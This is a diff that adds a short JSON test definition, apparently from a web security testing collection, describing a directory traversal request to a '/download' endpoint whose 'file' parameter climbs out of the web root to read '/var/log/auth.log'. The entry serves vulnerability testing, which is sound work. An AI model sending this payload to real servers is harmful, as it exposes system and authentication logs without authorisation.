@@ -1,0 +1,12 @@
+{
+    "name": "Directory Traversal to Access Sensitive Files",
+    "description": "Access sensitive file outside web root",
+    "method": "GET",
+    "endpoint": "/download",
+    "headers": {
+        "Content-Type": "application/json"
+    },
+    "parameters": {
+        "file": "../../../../var/log/auth.log"
+    }
+}
